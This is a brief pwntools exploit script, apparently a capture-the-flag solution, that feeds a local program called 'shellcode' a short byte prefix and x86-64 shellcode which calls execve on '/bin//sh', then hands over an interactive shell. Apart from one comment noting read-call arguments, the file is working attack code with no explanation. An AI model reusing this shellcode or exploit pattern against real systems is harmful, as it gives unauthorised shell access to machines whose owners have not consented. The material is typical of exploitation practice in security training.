from pwn import *

e = ELF('./shellcode')
p = process('./shellcode')

shellcode = '\x74\x00'
shellcode += "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

'''
read
arg[0]: 0x0 
arg[1]: 0x7ffff7ffb000 --> 0x0 
arg[2]: 0x200 
'''
print p.recvuntil('plz:\n')
p.sendline(shellcode)
p.interactive()